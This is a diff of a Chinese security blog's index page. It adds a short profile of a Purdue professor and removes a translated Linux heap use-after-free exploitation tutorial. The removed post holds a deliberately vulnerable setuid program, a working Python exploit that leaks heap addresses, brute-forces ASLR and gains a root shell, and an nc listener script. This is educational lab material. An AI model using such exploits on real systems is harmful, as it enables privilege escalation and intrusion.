@@ -99,6 +99,14 @@
 </header>
 
 
+  <div style="background:#fff;width: 100%;">
+
+      <div style="max-height:600px; overflow: hidden;">
+        <img width="100%" alt="Hike News" src="/css/images/pose.jpg">
+      </div>
+
+  </div>
+
 
 
   <div id="container">
@@ -107,6 +115,58 @@
       <div id="content" class="outer">
         
           <section id="main">
+  
+    <article id="post-byoungyounglee"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170224/byoungyounglee/">Purdue大学助理教授Byoungyoung Lee</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170224/byoungyounglee/" class="article-date">
+	  <time datetime="2017-02-24T06:21:39.000Z" itemprop="datePublished">二月 24, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p><strong>CSysSec注</strong>： 本系列文章旨在介绍计算机系统与安全领域著名教授与学者</p>
+<p><strong>转载请注明</strong>： 文章出处：《<a href="http://www.csyssec.org/20170224/byoungyounglee/" target="_blank" rel="external">Purdue大学助理教授Byoungyoung Lee</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec</a></p>
+<hr>
+<h3 id="个人简介"><a href="#个人简介" class="headerlink" title="个人简介"></a>个人简介</h3><p>Byoungyoung Lee，11-16年在佐治亚理工大学获得博士学位，师从<a href="">Prof. Wenke Lee</a>和<a href="">Prof. Taesoo Kim</a>. 16年以助理教授身份加入Purdue大学计算机系.</p>
+<h3 id="研究兴趣"><a href="#研究兴趣" class="headerlink" title="研究兴趣"></a>研究兴趣</h3><p>集中关注系统安全：在操作系统、编译器以及应用程序中设计与实现安全的系统。在NDSS,Security,CCS,ATC发表多篇论文，曾获CSAW, DEFCON, Facebook, Usenix等多项大奖</p>
+<h3 id="论文标签"><a href="#论文标签" class="headerlink" title="论文标签"></a>论文标签</h3><p>[ASLR],[SGX],[Code reuse attack], [Use-after-free],[Data Flow Integrity]</p>
+<h3 id="个人主页"><a href="#个人主页" class="headerlink" title="个人主页"></a>个人主页</h3><p><a href="https://lifeasageek.github.io/" target="_blank" rel="external">Byoungyoung Lee</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/学术专家/">学术专家</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Professor/">Professor</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
   
     <article id="post-migration"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
@@ -817,115 +877,6 @@ sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$
 <!-- Table of Contents -->
 
   
-    <article id="post-useafterfree"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170104/useafterfree/">Use-after-free</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170104/useafterfree/" class="article-date">
-	  <time datetime="2017-01-04T15:36:12.000Z" itemprop="datePublished">一月 4, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/useafterfree" target="_blank" rel="external">Linux(X86)漏洞利用系列-Use-after-free)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X01 什么是use-after-free</li>
-<li>0X02 什么是信息泄露,攻击者如何利用</li>
-</ul>
-</blockquote>
-<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">栈内off-by-one漏洞利用</a><br>    <a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a><br><u>VM Setup</u>: Fedora 20(x86)</p>
-<h3 id="0X01-什么是use-after-free"><a href="#0X01-什么是use-after-free" class="headerlink" title="0X01 什么是use-after-free"></a>0X01 什么是use-after-free</h3><p>当一个堆内存指针已经被释放，继续使用这个指针时，就称为use-after-free bug。这种bug能导致任意代码执行。</p>
-<p><u>漏洞代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE1 1020</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 4)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span>* details = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">strncpy</span>(name, argv[<span class="number">1</span>], <span class="number">12</span><span class="number">-1</span>); <span class="comment">/* [3] */</span></div><div class="line"> <span class="built_in">free</span>(details); <span class="comment">/* [4] */</span></div><div class="line"> <span class="built_in">free</span>(name);  <span class="comment">/* [5] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>,name); <span class="comment">/* [6] */</span></div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* tmp = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [7] */</span></div><div class="line"> <span class="keyword">char</span>* p1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [8] */</span></div><div class="line"> <span class="keyword">char</span>* p2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [9] */</span></div><div class="line"> <span class="built_in">free</span>(p2); <span class="comment">/* [10] */</span></div><div class="line"> <span class="keyword">char</span>* p2_1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [11] */</span></div><div class="line"> <span class="keyword">char</span>* p2_2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [12] */</span></div><div class="line"></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Enter your region\n"</span>);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> read(<span class="number">0</span>,p2,BUFSIZE1<span class="number">-1</span>); <span class="comment">/* [13] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Region:%s\n"</span>,p2); </div><div class="line"> <span class="built_in">free</span>(p1); <span class="comment">/* [14] */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u>编译命令</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p><u>注意</u>: 不像<a href="http://www.csyssec.org/20170104/heap-offbyone/" target="_blank" rel="external">前文</a>，这里打开了ASLR. 现在让我们开始利用UaF bug吧，由于已经打开了ASLR，我们用信息泄露和暴力破解技术来绕过它。</p>
-<p>上述漏洞代码含有两个UaF bug，分别在第[6]和[13]行。它们相对应的堆内存分别在第[5]和第[10]行被释放，但它们的指针在释放后仍然再次被使用 （第[6]和[13]行)！！ 第[6]行的UaF导致信息泄露，而第[13]行的UaF导致任意代码执行。</p>
-<h3 id="0X02-什么是信息泄露？攻击者如何利用？"><a href="#0X02-什么是信息泄露？攻击者如何利用？" class="headerlink" title="0X02 什么是信息泄露？攻击者如何利用？"></a>0X02 什么是信息泄露？攻击者如何利用？</h3><p>在漏洞代码中(第[6]行)，信息是通过堆地址被泄露的。泄露的堆地址可以帮助攻击者很容易的算出已经被随机化的堆基地址，从而击败ASLR!</p>
-<p>为了理解堆地址是如何被泄露的，我们先来理解一下漏洞代码的上半部分。</p>
-<ul>
-<li>第[1]行分配了16字节的堆内存给’name’</li>
-<li>第[2]行分配了16字节的堆内存给’details’</li>
-<li>第[3]行将程序的argv[1]参数拷贝到’name’堆内存区域</li>
-<li>第[4]和[5]行回收’name’和’details’堆内存给glibc malloc。</li>
-<li>第[6]行的printf 在’name’指针被释放后继续使用，导致泄露堆地址。</li>
-</ul>
-<p>从<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">前文</a>我们知道，对应于’name’和’details’指针的chunk属于fast chunk。当这些fast chun被释放时，会被存储在fast bins的<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3887" target="_blank" rel="external">0索引处</a>(index zero)。我们也知道每个fast bin含有空闲chunks的单链表。因此在我们的例子中，fast bin的 0索引中的单链表形式如下所示：</p>
-<pre><code>main_arena.fastbinsY[0] ---&gt; &apos;name_chunk_address&apos; ---&gt; &apos;details_chunk_address&apos; ---&gt; NULL
-</code></pre><p>由于这种单链表形式，’name’的前四个字节含有’details_chunk’的地址。因此，当’name’被输出时，‘details_chunk’的地址先被输出。从堆栈布局，我们知道’details_chunk’ 位于堆基地址的偏移0x10处。因此，从获取被泄露的地址中减去0x10，就可以得到堆的基地址了。</p>
-<pre><code>如何做到任意代码执行
-</code></pre><p>现在已经获取随机化的堆基地址，理解漏洞代码的下半部分，让我们来看看是怎么做到任意代码执行的。</p>
-<ul>
-<li>第[7]行分配了16字节的堆内存给’tmp’</li>
-<li>第[8]行分配了1024字节的堆内存给’p1’</li>
-<li>第[9]行分配了1024字节的堆内存给’p2’</li>
-<li>第[10]行回收了’p2’的1024字节堆内存给glibc malloc</li>
-<li>第[11]行分配了512字节的堆内存给’p2_1’</li>
-<li>第[12]行分配了512字节的堆内存给’p2_2’</li>
-<li>第[13]行的read在’p2’被释放后继续使用它</li>
-<li>第[14]行回收了’p1’的1024字节堆内存给glibc malloc，当程序退出时，导致任意代码执行。</li>
-</ul>
-<p>通过阅读<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">前文</a>，我们知道当’p2’被回收给glibc maloc时候，会被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L4017" target="_blank" rel="external">合并</a>到top chunk。 之后，当为’p2_1’请求内存时，会从top chunk中<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3755" target="_blank" rel="external">分配</a>- ‘p2’和’p2_1’含有相同的堆地址。当为’p2_2’请求内存时，会从top chunk中- ‘p2\2’距’p2’有512字节。当’p2’指针释放后被使用(第[13]行)，攻击者控制的数据(最多1019字节)被拷贝到’pc_1’中，而’p2_1’只有512字节，剩下的被攻击者控制的字节会覆盖下一个chunk’p2_2’，这样一来就允许攻击者覆盖下一个chunk的头部size域!!!</p>
-<p><u>堆布局</u>：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/useafterfree.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/useafterfree.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<p>在<a href="http://www.csyssec.org/20170104/heap-offbyone/" target="_blank" rel="external">这里</a>可以看出，如果攻击者成功覆盖下一个chunk的size域，就可以欺骗glibc malloc来unlink chunk ‘p2_1’了，尽管这时chunk已经处于分配状态。在<a href="http://www.csyssec.org/20170104/heap-offbyone/" target="_blank" rel="external">同一篇</a>文中，我们也知道只要攻击者能小心的构造一个假的chunk头部信息，unlink一个已经处于分配状态的大chunk会导致任意代码执行!! 攻击者按一下方式构造假的chunk头部信息：</p>
-<ul>
-<li>fd必须指回被释放的chunk地址。从堆布局中可以发现，’p2_1’位于偏移0x410处。 因此，fd=heap_base_address(可以从信息泄露bug中获取) + 0x410.</li>
-<li>bk也要指回被释放的chunk地址。从堆布局中可以发现，’p2_1’位于偏移0x410处。 因此，fd=heap_base_address(可以从信息泄露bug中获取) + 0x410.</li>
-<li>fd_nextsize必须指向tls_dtor_list - 0x14。 ‘tls_dtor_list’属于glibc的私有匿名映射段中，它已经被随机化。因此，可以利用下面的漏洞利用代码中的暴力破解技术绕过随机化。</li>
-<li>bk_nextsize必须指向含有dtor_list元素的堆地址！ 在构建假的chunk 头之后，’system’ dtor_list被攻击者注入，这时，’setuid’ dtor_list被攻击者注入来替代’p2_1’的堆内存区域。从堆布局中，我们可以知道’system’ 和’setuid’ dtor_list分别位于0x428和0x618处。</li>
-</ul>
-<p>得到所有这些信息之后，我们就可以写个漏洞利用程序攻击二进制文件’vuln’了。</p>
-<p><u>漏洞利用代码</u>：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">import sys</div><div class="line">import telnetlib</div><div class="line">import time</div><div class="line"></div><div class="line">ip = '127.0.0.1'</div><div class="line">port = 1234</div><div class="line"></div><div class="line">def conv(num): return struct.pack("&lt;I</div><div class="line">def send(data):</div><div class="line"> global con</div><div class="line"> con.write(data)</div><div class="line"> return con.read_until('\n')</div><div class="line"></div><div class="line">print "** Bruteforcing libc base address**"</div><div class="line">libc_base_addr = 0xb756a000</div><div class="line">fd_nextsize = (libc_base_addr - 0x1000) + 0x6c0</div><div class="line">system = libc_base_addr + 0x3e6e0</div><div class="line">system_arg = 0x80482ae</div><div class="line">size = 0x200</div><div class="line">setuid = libc_base_addr + 0xb9e30</div><div class="line">setuid_arg = 0x0</div><div class="line"></div><div class="line">while True:</div><div class="line"> time.sleep(4)</div><div class="line"> con = telnetlib.Telnet(ip, port)</div><div class="line"> laddress = con.read_until('\n')</div><div class="line"> laddress = laddress[8:12]</div><div class="line"> heap_addr_tup = struct.unpack("&lt;I", laddress)</div><div class="line"> heap_addr = heap_addr_tup[0]</div><div class="line"> print "** Leaked heap addresses : [0x%x] **" %(heap_addr)</div><div class="line"> heap_base_addr = heap_addr - 0x10</div><div class="line"> fd = heap_base_addr + 0x410</div><div class="line"> bk = fd</div><div class="line"> bk_nextsize = heap_base_addr + 0x618</div><div class="line"> mp = heap_base_addr + 0x18</div><div class="line"> nxt = heap_base_addr + 0x428</div><div class="line"></div><div class="line"> print "** Constructing fake chunk to overwrite tls_dtor_list**"</div><div class="line"> fake_chunk = conv(fd)</div><div class="line"> fake_chunk += conv(bk)</div><div class="line"> fake_chunk += conv(fd_nextsize)</div><div class="line"> fake_chunk += conv(bk_nextsize)</div><div class="line"> fake_chunk += conv(system)</div><div class="line"> fake_chunk += conv(system_arg)</div><div class="line"> fake_chunk += "A" * 484</div><div class="line"> fake_chunk += conv(size)</div><div class="line"> fake_chunk += conv(setuid)</div><div class="line"> fake_chunk += conv(setuid_arg)</div><div class="line"> fake_chunk += conv(mp)</div><div class="line"> fake_chunk += conv(nxt)</div><div class="line"> print "** Successful tls_dtor_list overwrite gives us shell!!**"</div><div class="line"> send(fake_chunk)</div><div class="line"></div><div class="line"> try: </div><div class="line">  con.interact()</div><div class="line"> except: </div><div class="line">  exit(0)</div></pre></td></tr></table></figure>
-<p>使用暴力破解技术，我们需要尝试许多次来绕过随机化直至成功。我们可以让漏洞程序’vuln’作为网络服务器来运行，然后使用shell脚本保证当系统奔溃时能自动重启。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#vuln.sh</span></div><div class="line">#!/bin/sh</div><div class="line">nc_process_id=$(pidof nc)</div><div class="line"><span class="keyword">while</span> :</div><div class="line"><span class="keyword">do</span></div><div class="line"> <span class="keyword">if</span> [[ -z $nc_process_id ]]; then</div><div class="line"> echo <span class="string">"(Re)starting nc..."</span></div><div class="line"> nc -l -p <span class="number">1234</span> -c <span class="string">"./vuln sploitfun"</span></div><div class="line"> <span class="keyword">else</span></div><div class="line"> echo <span class="string">"nc is running..."</span></div><div class="line"> fi</div><div class="line">done</div></pre></td></tr></table></figure>
-<p>执行上述漏洞利用代码可以得到root shell! 太棒了!</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Shell<span class="number">-1</span>$./vuln.sh</div><div class="line">Shell<span class="number">-2</span>$python <span class="built_in">exp</span>.py</div><div class="line">...</div><div class="line">** Leaked heap addresses : [<span class="number">0x889d010</span>] **</div><div class="line">** Constructing fake chunk to overwrite tls_dtor_list**</div><div class="line">** Successfull tls_dtor_list overwrite gives us shell!!**</div><div class="line">*** Connection closed by remote host ***</div><div class="line">** Leaked heap addresses : [<span class="number">0x895d010</span>] **</div><div class="line">** Constructing fake chunk to overwrite tls_dtor_list**</div><div class="line">** Successfull tls_dtor_list overwrite gives us shell!!**</div><div class="line">*** Connection closed by remote host ***</div><div class="line">id</div><div class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1000</span>(bala) groups=<span class="number">0</span>(root),<span class="number">10</span>(wheel),<span class="number">1000</span>(bala) context=unconfined_u:unconfined_r:<span class="keyword">unconfined_t</span>:s0-s0:c0.c1023</div><div class="line"><span class="built_in">exit</span></div><div class="line">** Leaked heap addresses : [<span class="number">0x890c010</span>] **</div><div class="line">** Constructing fake chunk to overwrite tls_dtor_list**</div><div class="line">** Successfull tls_dtor_list overwrite gives us shell!!**</div><div class="line">*** Connection closed by remote host ***</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
-<p><u>参考</u>:</p>
-<p><a href="http://v0ids3curity.blogspot.in/2015/02/revisiting-defcon-ctf-shitsco-use-after.html" target="_blank" rel="external">1. Revisiting Defcon CTF Shitsco Use-After-Free Vulnerability – Remote Code Execution</a></p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/useafterfree" target="_blank" rel="external">Linux(X86)漏洞利用系列-Use-after-free)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -1018,6 +969,18 @@ sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170301/kernel-malloc/">深入理解Linux内存分配</a></h6>
+          <!--  <span>三月 1, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -1194,18 +1157,6 @@ sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$
             
 
               <h6 style="margin: 0;"><a href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a></h6>
-          <!--  <span>一月 4, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170104/pinintro/">二进制代码注入PIN</a></h6>
           <!--  <span>一月 4, 2017</span> -->
             </div>
 
